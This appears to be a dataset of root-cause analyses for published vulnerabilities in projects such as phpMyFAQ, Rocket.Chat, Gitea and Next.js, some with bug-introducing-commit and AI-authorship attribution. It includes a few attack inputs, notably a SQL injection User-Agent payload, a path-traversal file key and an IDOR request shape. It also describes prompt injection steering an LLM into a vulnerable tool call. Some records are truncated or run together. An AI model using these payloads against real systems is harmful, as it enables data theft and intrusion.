causal_chain.bug_semantics: Unauthenticated POST /api/setup/backup is rewritten to api/index.php and dispatched to SetupController::backup(). The handler accepts any non-empty body as an 'installed version' string, constructs phpMyFAQ\Setup\Update, and calls createConfigBackup() on the configuration directory (content/core/config, or config/ for pre-4.0 trees). That method writes a ZIP named phpmyfaq-config-backup.YYYY-MM-DD.zip into that directory and returns a public URL under the site origin. The JSON response field backupFile is that URL. Because backup() performed no login, API-token, or permission check (SetupController originally did not even extend AbstractController), any remote caller can generate the archive and fetch it. The ZIP includes database.php and other config files, disclosing DB credentials. Default Apache/nginx rewrite rules expose the route. After 4.0.16, backup() calls userIsAuthenticated() (401 if not logged in) and content/*.zip is denied by .htaccess/nginx.

causal_chain.bug_semantics: Parse Server's default fileUpload.fileExtensions control is supposed to stop uploads that browsers will render as active content. FilesRouter.createHandler prefers the filename extension when the name contains a dot, and only consults Content-Type as a fallback. Independently, FilesController.createFile sets contentType = mime.getType(filename) || contentType, so an unrecognized extension (note.foo, data.bar, or no usable extension) stores the client Content-Type verbatim. A malformed Content-Type that is not a type/subtype token (image, image/, image//svg+xml) does not yield a blocklisted subtype: split('/')[1] is empty or the bare token image is not in the blocklist, so the upload is accepted. S3/GCS/Azure then serve that unparseable Content-Type; browsers MIME-sniff an HTML/script body and execute it in the application origin against other users who open the file URL. GridFS is not a sink because it recomputes Content-Type from the filename and sends X-Content-Type-Options: nosniff. Later GHSA-v8x7-r927-cc93 added a Content-Type subtype check when mime does not recognize the extension, but still used the same split('/') extraction, so malformed values continued to bypass.

causal_chain.bug_semantics: Unauthenticated CWE-89 in phpMyFAQ's built-in captcha. BuiltinCaptcha stores the raw User-Agent header and client IP at construction, then interpolates those strings into sprintf-built DELETE (garbageCollector) and INSERT (saveCaptcha) queries against faqcaptcha with no Database::escape() or bound parameters. getCaptchaImage() always runs both methods. GET /api/captcha (api.private.captcha) is an unauthenticated image endpoint that calls getCaptchaImage(), so a crafted User-Agent such as x' OR SLEEP(2) OR 'x executes in both sinks. Quote-breaking payloads can time-based-exfiltrate other tables (faquser hashes, faqconfig secrets) or widen the DELETE WHERE clause. validateCaptchaCode() in the same class already escaped the captcha id, showing the omission on userAgent/ip was not universal. MySQL/MariaDB query() is single-statement, so stacked queries are not the primitive; time-based blind SQLi and WHERE rewrite still work.

The advisory describes a real, unauthenticated SQL injection: raw User-Agent and client IP are sprintf-interpolated into faqcaptcha DELETE and INSERT queries that run on every public GET /api/captcha. CVE.org/VulnCheck and the vendor GHSA are published and not withdrawn, so this is not a false positive. Tracing the INSERT interpolation through renames and formatting-only refactors lands on e6909f6f (2006-06-11), which first added Captcha.php saveCaptcha() with an unescaped $this->userAgent INSERT. The immediate parent tree lacks that file and that query, so e6909f6f is the surviving first-write; earlier April 2006 'Added Captcha class' commits did not actually add the class body. The 2014 DELETE-by-useragent sink and the 2024 API route widened exposure but did not originate the defective interpolation. The 4.1.2 patch is 545bdffb1, which wraps the same fields in Database::escape() via escapeQueryValue() and is the sole captcha-file change between 4.1.1 and 4.1.2. AI attribution is taken only from the BIC commit object: a 2006 CVS-converted human author with no AI trailers. Therefore the case is a real vulnerability with a human BIC: NOT_AI.

causal_chain.bug_semantics: When `debug ospf packet ... detail` is enabled, LS Update dump of Opaque LSAs calls ospf_opaque_lsa_dump, which wraps stream_pnt(s) into a stack ospf_lsa and invokes show_opaque_info_detail with vty=NULL so details go to zlog. show_opaque_info_detail then dispatches to type-specific show_opaque_info. Extended Link/Prefix callbacks in ospfd/ospf_ext.c (ospf_ext_link_show_info / ospf_ext_pref_show_info and helpers show_vty_ext_link_adj_sid, show_vty_link_info, check_tlv_size, etc.) call vty_out(vty,...) without testing vty, so a remote OSPF neighbor sending a Type-10/11 Extended Opaque LSA causes a NULL dereference and ospfd DoS. The reporter's unused lsa.data NULL check does not match this sink; stream_pnt is not NULL on a live dump stream.

causal_chain.bug_semantics: When Signup and CreateUserDir are both enabled, signupHandler copies defaults, clears Scope, and calls Settings.MakeUserDir(username, scope, root). MakeUserDir runs the username through cleanUsername (trim spaces, delete '..', replace any character outside [0-9A-Za-z@_.-] with '-', collapse repeated dashes) and joins that onto UserHomeBasePath. Distinct raw usernames such as teamone/x and teamone-x therefore resolve to the same directory. Username uniqueness is only storm-unique on the raw Username field, MkdirAll is idempotent, and until the fix nothing checked whether another user already owned the derived Scope. The second registrant is stored with the first user's home directory and can read and overwrite that user's files through the normal /api/raw and /api/resources handlers.

causal_chain.bug_semantics: Portainer CE shipped Docker environment security flags that defaulted to allowing non-admin users bind mounts, privileged mode, host PID/IPC namespace, device mapping, extra capabilities, and sysctls. An authenticated regular user with access to an endpoint could create a container or stack that bind-mounts host paths (researcher PoC read /etc/shadow) or otherwise obtain root-equivalent host execution. The flags existed as opt-out restrictions (UI: 'Disable bind mounts for non-administrators') rather than secure-by-default denials. After 2021 they lived on per-endpoint EndpointSecuritySettings and were copied as true onto every newly created environment; 2.33.2 still initialized them true. The 2.38.0/2.39.0 fix flips those defaults to false via DefaultEndpointSecuritySettings() (stack management remains allowed) and always validates non-admin stack files.

causal_chain.bug_semantics: BlenderMCPServer.download_polyhaven_asset (addon.py, asset_type=models) fetches a JSON file listing from api.polyhaven.com and treats each key of file_info['include'] as a relative path under tempfile.mkdtemp(). Those keys are concatenated with os.path.join(temp_dir, include_path) and the corresponding include URL bytes are written with open(..., 'wb') after os.makedirs on the dirname. There is no abspath/normpath containment check, so a key such as '../../.bashrc' or an absolute path writes outside the temp directory as the Blender process user. The keys are attacker-controlled via a malicious or MITM'd Poly Haven files API response, or via an MCP prompt-injection that causes the LLM to call the download_polyhaven_asset tool. That is CWE-22 arbitrary file write, as shown in issue #257.

causal_chain.bug_semantics: In PPR/Cache Components deployments (minimalMode), Next.js treats POST requests with header next-resume: 1 as an internal concatenating resume: it drains the request body as postponed state (originally unbounded for-await on req.body; later readBodyWithSizeLimit) and stores it as request meta. That header is a proxy-to-origin protocol and is never sent by browsers. Because it was read from untrusted req.headers and was omitted from INTERNAL_HEADERS / filterInternalHeaders, a client can attach Next-Resume to a crafted POST, including a Server Action. The resume body consumer then races with Server Action body parsing and/or waits on an incomplete body, leaving connections and file descriptors open until capacity is exhausted (CWE-770).

causal_chain.bug_semantics: POST /api/public/v1/roles/assign is an Enterprise EXPANDED_PUBLIC_API endpoint. builderOrAdmin allows any builder for the x-budibase-app-id workspace, including users with only builder.apps. The public controller destructures userIds and forwards the rest of the JSON body to sdk.publicApi.roles.assign. That SDK, with no caller identity check, sets user.builder={global:true} and/or user.admin={global:true} for every supplied user id and bulk-updates the global user DB. A workspace-scoped builder with an API key can therefore promote themselves or any other tenant user to global admin (CWE-915 mass assignment of global privileges). The same path unassigns global roles. The 2026-05-12 controller check requires isAdmin for admin grants and isGlobalBuilder for builder grants, which closes this escalation without changing the SDK write.

causal_chain.bug_semantics: Velociraptor client artifacts run on the endpoint without per-plugin ACL checks. The server is supposed to gate dangerous artifacts via the artifact's required_permissions list, enforced in services/launcher/acls.go CheckAccess before CompileCollectorArgs/ScheduleArtifactCollection. Admin.Client.UpdateClientConfig overwrites the client config file with caller-supplied YAML (copy to ConfigPath) and rekeys or kills the client process so the new config takes effect, enabling endpoint takeover. The artifact shipped with RequiredPermissions unset, so CheckAccess returned nil after the usual COLLECT_CLIENT check. The Investigator role grants CollectClient but not EXECVE or FILESYSTEM_WRITE, so a user who could already collect artifacts could run this admin artifact and rewrite client config.

causal_chain.bug_semantics: Rocket.Chat REST addRoute enforces manage-apps only when the options object contains the key permissionsRequired. In the Apps-Engine log endpoints, that key was misspelled permissionRequired. checkPermissions() therefore returned false, shouldVerifyPermissions stayed false, and GET /api/apps/logs plus GET /api/apps/:id/logs required only authentication. Any logged-in user could read Apps-Engine logs that were intended for manage-apps. The sink is _orch.getLogStorage().find(...) returning log records. The fix restores the plural key so the existing permission middleware runs.

causal_chain.bug_semantics: An application that loads untrusted protobuf JSON descriptors via Root.fromJSON() or Namespace.addJSON() will recursively expand each nested object. Unmatched nested objects are treated as namespaces and Namespace.fromJSON immediately calls addJSON on json.nested, while Type.fromJSON/Service.fromJSON also walk json.nested and fall back to Namespace.fromJSON. Before the 2026 depth guards there was no recursionLimit on this path, so a single deep chain of nested namespace (or nested type/service) objects grows the JavaScript call stack until it overflows and crashes schema loading (DoS, CWE-674). Preconditions: attacker-influenced JSON descriptor input and the JSON expansion path rather than only .proto text parsing.

causal_chain.bug_semantics: pyasn1 BER/CER/DER decoders parse OBJECT IDENTIFIER and RELATIVE-OID payloads by walking each sub-identifier octet and growing an immutable tuple with oid += (subId,) (and the multi-octet-arc equivalent). Each concatenation copies all arcs seen so far, so N arcs is O(N^2) CPU. A small crafted substrate (advisory: tens of kilobytes; regression tests: 4096 single-byte 0x01 arcs under tag 0x06/0x0D) makes decode() take seconds, denying service to any consumer of untrusted ASN.1 (certificates, LDAP, SNMP, Kerberos). ObjectIdentifierEncoder and RelativeOIDEncoder have the same quadratic outer-loop concatenation (octets += (subOid,)), reachable when an application re-encodes previously decoded attacker values. CVE-2026-23490 only bounded per-arc continuation-octet length, not arc count. The 0.6.4 fix accumulates into a list (append/extend) and converts to a tuple once.

causal_chain.bug_semantics: Netty codec-dns encodes and decodes DNS domain names without RFC 1035 size/content checks. On encode, a user-influenced name is split on '.' and each label's Java length is written as a single length byte followed by the raw bytes (ByteBufUtil.writeAscii / getBytes), so a NUL in a label is emitted, a label >63 can write 0xC0-0xFF (compression-pointer range), an empty label historically terminated or truncated the rest of the name, and the total encoded name can exceed 255 octets. On decode, each non-pointer length byte is trusted: the decoder only checks that that many bytes exist, then appends them to an unbounded StringBuilder, so a malicious DNS response can produce labels >63 and decoded names >255. Downstream resolvers, caches, and allowlists that assume RFC 1035 names can then disagree with Netty (cache poisoning / validation bypass) or spend unbounded memory. The 2026 fix rejects empty interior labels, labels >63, embedded NULs, and names >255 on encode, and throws TooLongFrameException for decoder label >63 or decoded name >255.

causal_chain.bug_semantics: GoCardless (formerly Nordigen) bank-sync on the Actual sync-server writes raw provider payloads to stdout. The default IntegrationBank path JSON.stringifies the full account object (IBAN/BBAN, owner_name and other PII) and the first ten transactions/balances on every normalize/sort/starting-balance call; Node console.debug is an alias of console.log, so Docker/journald retain those records. Separately, unclassified GoCardless errors are logged with util.inspect(error, {depth:null}), which expands nested AxiosError.config.headers.Authorization and dumps the GoCardless bearer token. Anyone who can read server logs (shared hosts, managed Actual providers, docker logs) obtains bank account numbers, transaction details, and API tokens.

causal_chain.bug_semantics: Unauthenticated (or API) registration accepts a distinct login plus an email and persists the email in faquserdata without a uniqueness check. Source: Frontend RegistrationController::create / Api RegistrationController::create (4.0.12) pass the posted email into RegistrationHelper::createUser. causal_chain.bug_semantics: NRF's unauthenticated OAuth2 token endpoint POST /oauth2/token parses application/x-www-form-urlencoded bodies by reflecting over models.NrfAccessTokenAccessTokenReq (historically models.AccessTokenReq). String and NF-type fields are SetString(); every other matched yaml-tag field is json.Unmarshal'd into a models.PlmnId and assigned with reflect.Value.Set. When the real field type is a slice ([]PlmnId, []Snssai, []PlmnIdNid, []string) or a different pointer (*PlmnIdNid), Go panics with 'reflect.Set: value of type *models.PlmnId is not assignable to type ...'. Gin recovery converts the panic to HTTP 500 without killing the process, so a remote client can repeatedly trigger expensive stack-trace panics on the token-issuance path. This is parser type-confusion (CWE-843) plus missing input-type validation (CWE-20), not an auth bypass.

causal_chain.bug_semantics: Velociraptor VQL upload_azure, upload_sftp, and upload_smb run on the server and open caller-controlled Azure SAS, SSH/SFTP, or SMB sessions. After NETWORK was added as the permission for outbound access, those Call() methods never invoked CheckAccess(NETWORK) and only declared FILESYSTEM_READ in plugin metadata. causal_chain.bug_semantics: uutils rm implements --preserve-root (default) by testing whether the command-line path string looks like '/'. From first implementation that was filename != "/", later rewritten as path.has_root() && path.parent().is_none() in handle_dir. A symlink such as /tmp/rootlink -> / has a parent component, so is_root is false; rm -rf --preserve-root /tmp/rootlink/ (or an equivalent path that is a directory after following the link) therefore recursively removes through the link into the real root tree. GNU rm instead caches /'s device/inode and compares directories it enters. The 2026 fix adds is_root_path() that still accepts a literal '/', but also canonicalizes so a symlink (or nested symlink) to / is treated as root and rejected when preserve_root and recursive are set.

causal_chain.bug_semantics: The Meteor DDP method autoTranslate.translateMessage takes a client-supplied IMessage and, without Meteor.userId() or canAccessRoomAsync, calls translateMessage(targetLanguage, message). The helper trusts message.rid to load a room and then returns TranslationProviderRegistry.translateMessage(), which always does Messages.findOneById(message._id). After the helper began returning that document, any DDP caller who knew a message _id and any existing room id received the full stored message (private channels, DMs, E2EE rooms). The May 2026 fix authenticates the caller, loads the message by _id on the server, checks room membership, and translates only that server-fetched message.

HackerOne 3734326 (disclosed): DDP method autoTranslate.translateMessage accepts a client-supplied IMessage and passes it to translateMessage() without Meteor.userId() or room membership; REST was fixed with canAccessRoomAsync in RocketChat/Rocket.Chat#40508 but DDP was missed.
Pre-fix method (5c8efa79^:apps/meteor/app/autotranslate/server/methods/translateMessage.ts) is `return translateMessage(targetLanguage, message)` with no userId/canAccessRoomAsync.

Shared helper (same parent: apps/meteor/app/autotranslate/server/functions/translateMessage.ts) looks up Rooms.findOneById(message.rid) from the client object (no membership check) and returns TranslationProviderRegistry.translateMessage(), which ends in `return Messages.findOneById(message._id)` (apps/meteor/app/autotranslate/server/autotranslate.ts).

Attack: authenticated DDP call with `{_id: <any message id>, rid: <any existing room id>}` causes the method to return the stored IMessage (private/DM/E2EE content) because findOneById uses the client _id and the method never checks room access.

Fix PR RocketChat/Rocket.Chat#40528 (develop squash 5c8efa79ece3b86e6f5e29809efaac808912eeb0) requires Meteor.userId(), check(_id/targetLanguage, String), Messages.findOneById, and canAccessRoomAsync, then translates the server-fetched message.

causal_chain.reasoning: CVE-2026-32995 is a published CWE-284 IDOR in Rocket.Chat's autoTranslate.translateMessage DDP method, not a withdrawn/false advisory. The method has never checked Meteor.userId() or room membership since it was added in 2017 (d7d4f082, merged via PR #6110), but that original implementation returned the client-supplied message object. After 2019 the provider began returning Messages.findOneById(message._id) while the DDP method discarded the value. The first commit that made the shared helper return that stored document—and therefore made the existing unauthenticated DDP passthrough (`return translateMessage(targetLanguage, message)` from refactor b14a5c15) leak private message bodies by _id—is PR #38978 member 1d31a80, squashed to develop as a4e3c163 and first released in 8.3.0. Immediate parent 50e0f906 lacks that return. Vendor affected ranges also include 7.10–8.2, which had the same missing-auth method but a void helper; those lines still received the May 2026 access-control backports, matching the HackerOne note that REST was patched and DDP was missed. The develop fix 5c8efa79 (PR #40528) is the direct closure of that DDP path and is in 8.5.0, with equivalent backports on the listed patch tags. AI is judged only from the BIC commit object: Ahmed Nasser is a named human author/committer with no AI trailers or bot identity, so the verdict is NOT_AI.

CVE-2026-32995 is a published CWE-284 IDOR in Rocket.Chat's autoTranslate.translateMessage DDP method, not a withdrawn/false advisory. The method has never checked Meteor.userId() or room membership since it was added in 2017 (d7d4f082, merged via PR #6110), but that original implementation returned the client-supplied message object. After 2019 the provider began returning Messages.findOneById(message._id) while the DDP method discarded the value. The first commit that made the shared helper return that stored document—and therefore made the existing unauthenticated DDP passthrough (`return translateMessage(targetLanguage, message)` from refactor b14a5c15) leak private message bodies by _id—is PR #38978 member 1d31a80, squashed to develop as a4e3c163 and first released in 8.3.0. Immediate parent 50e0f906 lacks that return. Vendor affected ranges also include 7.10–8.2, which had the same missing-auth method but a void helper; those lines still received the May 2026 access-control backports, matching the HackerOne note that REST was patched and DDP was missed. The develop fix 5c8efa79 (PR #40528) is the direct closure of that DDP path and is in 8.5.0, with equivalent backports on the listed patch tags. AI is judged only from the BIC commit object: Ahmed Nasser is a named human author/committer with no AI trailers or bot identity, so the verdict is NOT_AI.

causal_chain.bug_semantics: When an auth-enabled collection leaves access.unlock unset, Payload defaults it to defaultAccess, which at v3.84.1/v3.88.0 is Boolean(user): any authenticated user. POST /api/<auth-slug>/unlock (unlockHandler -> unlockOperation) calls executeAccess on that function. A boolean-true result adds no ownership, role, or target-user Where; the operation then loads the document solely by the request email/username and resetLoginAttempts writes lockUntil=null and loginAttempts=0. A low-privileged logged-in attacker can therefore clear another account's lockout (including an administrator) and continue password guessing past maxLoginAttempts/lockTime. Default templates enable auth: true without overriding unlock, and maxLoginAttempts defaults to 5.

causal_chain.bug_semantics: mruby's compiler scope_new zero-initializes codegen_scope (nregs=0), then sets the stack pointer and nlocals to the local-variable count plus self without assigning nregs. nregs is only raised later if push() runs nregs_update (if sp > nregs). scope_finish copies the possibly-zero nregs into the irep (uint16_t). A nested class/module body executed via OP_EXEC does stack_extend(irep->nregs) then stack_clear(regs+1, irep->nregs-1). When nregs is 0, the uint16_t subtraction wraps to 65535, so stack_clear writes past the 128-slot (1024-byte) VM stack allocated by stack_init, which is the ASan heap-buffer-overflow in #6509.

causal_chain.bug_semantics: IPIPANCorpusReader metadata APIs (channels, domains, categories, and fileids filtered by those fields) all funnel through _get_tag(). Helpers derive a header path by calling str.replace('morph.xml','header.xml') on FileSystemPathPointer values from abspath/abspaths(). Because FileSystemPathPointer is a str subclass, replace() returns a bare string and drops the PathPointer wrapper, so _get_tag opens the path with builtin open() and never hits PathPointer.open() or nltk.pathsec. After 3.10.0, join() blocks literal '..' fileids and PathPointer.open() is sandboxed, but an in-root symlink whose name has no separators still passes join() and is followed by open(), disclosing arbitrary files the process can read. That is CWE-22/CWE-59 symlink escape of the pathsec sandbox, not a '../' traversal regression.

causal_chain.bug_semantics: On Unix recursive copy (-R/-r/-a) without --copy-contents, uu_cp treats character and block device nodes as stream sources. is_stream(metadata) is true for fifo||char||block. copy_helper recreates sockets and FIFOs in that mode but, before the fix, had no mknod path for devices, so copy_on_write called copy_stream: open the device, splice/read its bytes, and write them into a newly created regular file. That destroys device identity (a copied /dev/null is an empty regular file; major/minor are lost) and can hang or fill the disk when the source is an unbounded node such as /dev/zero. GNU cp instead mknods the destination unless --copy-contents is set. Non-recursive cp of a device as a file remains intended GNU behavior.

That matcher historically recognized solely /api/2.0/mlflow-artifacts/artifacts/ (GET/PUT/DELETE). Multipart upload is a separate POST surface at /mlflow-artifacts/mpu/{create,complete,abort}/<artifact_path>, implemented by _create_multipart_upload_artifact and siblings, which mint or complete cloud MPU credentials for the destination artifact path. Because those URLs do not start with the /artifacts/ prefix and POST had no proxy-artifact validator, an authenticated non-admin with no grant on another user's experiment still reached the MPU handlers. That yields unauthorized cross-user artifact writes, including model-file replacement and subsequent code execution on load. The 20919 fix adds /mlflow-artifacts/mpu/ prefixes on both REST and AJAX roots and maps POST to validate_can_update_experiment_artifact_proxy, restoring the same UPDATE check used for proxied PUT upload.

Auth for /mlflow-artifacts/artifacts/ was introduced earlier by da7048a and was complete for the routes that then existed. causal_chain.bug_semantics: verify() is a server VQL function callable from a GUI notebook by any principal with NOTEBOOK_EDITOR (analyst/investigator). When artifact is YAML/JSON rather than a known name, Call() does repository.Get (miss) then LoadYaml on whatever Repository is in hand. The result is an in-memory overwrite of live built-in or custom artifacts without ARTIFACT_WRITER, which artifact_set would have required. Source is vql/golang/verify.go:61 repository.LoadYaml after GetGlobalRepository; sink is services/repository/repository.go LoadProto self.Data[artifact.Name]=artifact. Attack: notebook query verify(artifact=yaml with name of a built-in).

causal_chain.bug_semantics: A high-privileged Magento admin can persist a malicious translation for admin confirm copy (inline-translation UI / translation form fields stored in the translation table). Magento admin delete and related action buttons concatenate those translated strings into JavaScript deleteConfirm() onclick handlers without escapeJs/escapeHtml. When a second admin opens the corresponding backend form, the stored payload executes in that admin session (stored XSS, scope changed), enabling session takeover and privilege escalation. This is CWE-79 as described by APSB25-94 CVE-2025-54264 (PR:H, UI:R, S:C, C:H, I:H).

Because project:admin is a same-type built-in project role, a user with only the narrow global scope role:manageProject could delete any in-use custom project role and reassign its holders instance-wide to project:admin, taking administrative control of projects they were not entitled to manage. The 2.33.4/2.34.1 patch refuses reassignment unless the role is global and the caller has role:manage plus user:changeRole (and is not deleting their own role), and the DTO accepts only assignable global role slugs.

causal_chain.bug_semantics: Langroid XMLToolMessage is the XML (non-JSON) tool-call path for LLM applications. Agent.get_tool_messages / _get_one_tool_message and ChatDocument tool-name extraction feed LLM-produced XML strings into XMLToolMessage.extract_field_values, which built an lxml XMLParser with only strip_cdata=False and then etree.fromstring. lxml's defaults resolve general entities and can load local DTDs/files, so a tool payload with an external entity (file://) or a nested-entity bomb is expanded during parse. That is CWE-611 XXE plus entity-expansion DoS. Version 0.53.4 closes the same sink by setting resolve_entities=False, load_dtd=False, and no_network=True on that parser.

causal_chain.bug_semantics: Gitea associates uploaded files with releases by client-supplied attachment UUIDs. Web NewReleasePost/EditReleasePost pass form.Files into CreateRelease/UpdateRelease, which call AddReleaseAttachments. Before 1.25.4 that function resolved UUIDs with GetAttachmentsByUUIDs/getAttachmentByUUID and wrote attachment.ReleaseID without checking that the attachment's RepoID matched the release's repository (it only later denied UUIDs already bound to some release). An attacker who can upload in a private repository (uploadAttachment records that repo's ID and returns a UUID) and who can create or edit a release in a different public repository they control can submit the private UUID as a release file. After the ReleaseID update, the public release page lists the asset and ServeAttachment authorized downloads via LinkedRepository(ReleaseID), i.e. against the public repo's read permission, disclosing the private blob to unauthorized users. PR #36347 closes the source by requiring attachments[i].RepoID == rel.RepoID and hardens the sink so a mismatched repo URL cannot serve the file.

Source: models/repo/release.go AddReleaseAttachments looks up client-supplied UUIDs and sets attachment.ReleaseID. On v1.25.3 the loop only rejects already-linked attachments (ReleaseID != 0); it does not compare attachments[i].RepoID to the release's RepoID.

Attack path: upload on a private repo (UploadReleaseAttachment/uploadAttachment stores RepoID + UUID) then pass that UUID in form.Files to CreateRelease/UpdateRelease on a different public repo the attacker can write.

Direct closure is PR #36347: AddReleaseAttachments returns permission denied when attachments[i].RepoID != rel.RepoID; ServeAttachment also 404s when ctx.Repo.Repository.ID != attach.RepoID.
